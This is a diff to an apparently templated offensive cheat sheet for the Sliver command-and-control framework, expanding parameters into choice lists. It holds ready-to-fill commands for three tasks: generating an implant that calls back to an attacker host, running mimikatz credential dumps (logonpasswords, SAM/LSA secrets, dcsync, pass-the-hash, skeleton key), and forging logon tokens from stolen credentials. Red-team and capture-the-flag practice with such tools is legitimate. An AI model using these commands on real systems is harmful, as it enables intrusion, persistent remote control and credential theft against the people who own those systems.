@@ -32,7 +32,7 @@ sliver client
 Build a Sliver implant for the chosen transport (mtls/http/tcp-pivot), OS, and name. `--skip-symbols` shrinks the binary at the cost of debug info.
 
 ```bash
-generate --{{TYPE:str:mtls}} {{LHOST:ip}}:{{LPORT:port:443}} --os {{OS:str:windows}} -N {{NAME:str:win}} {{TEMPLATE:str:--skip-symbols}}
+generate --{{TYPE:choice:mtls,http,https,dns,wg}} {{LHOST:ip}}:{{LPORT:port:443}} --os {{OS:choice:windows,linux,darwin}} -N {{NAME:str:win}} {{TEMPLATE:str:--skip-symbols}}
 ```
 
 <!-- meta: risk=high | phase=exploit | tags=sliver,generate,implant,mtls -->
@@ -219,7 +219,7 @@ download {{REMOTE_FILE:str:C:\Users\Administrator\Desktop\flag.txt}}
 Run a mimikatz command through the implant's built-in module (e.g. dump logon passwords, DPAPI, SAM/LSA secrets).
 
 ```bash
-mimikatz {{MIMICOMMANDS:str:sekurlsa::logonpasswords}}
+mimikatz {{MIMICOMMANDS:choice:sekurlsa::logonpasswords,sekurlsa::wdigest,sekurlsa::tickets,sekurlsa::pth,lsadump::sam,lsadump::secrets,lsadump::lsa,lsadump::dcsync,kerberos::list,kerberos::purge,privilege::debug,token::elevate,misc::skeleton,misc::memssp}}
 ```
 
 <!-- meta: risk=high | phase=post | tags=sliver,mimikatz,credentials,dump -->
@@ -230,7 +230,7 @@ mimikatz {{MIMICOMMANDS:str:sekurlsa::logonpasswords}}
 Forge a logon token from cleartext credentials. Use `.` as domain for local accounts; pick the LOGON_* type matching the target service.
 
 ```bash
-make-token -d {{DOMAIN:str:CORP.LOCAL}} -u {{USER:str:Administrator}} -p '{{PASS:str:Password123}}' --logon-type {{LOGON_TYPE:str:LOGON_NEW_CREDENTIALS}}
+make-token -d {{DOMAIN:str:CORP.LOCAL}} -u {{USER:str:Administrator}} -p '{{PASS:str:Password123}}' --logon-type {{LOGON_TYPE:choice:LOGON_NEW_CREDENTIALS,LOGON_INTERACTIVE,LOGON_NETWORK,LOGON_NETWORK_CLEARTEXT,LOGON_BATCH,LOGON_SERVICE,LOGON_UNLOCK}}
 ```
 
 <!-- meta: risk=high | phase=post | tags=sliver,token,credentials,impersonate -->
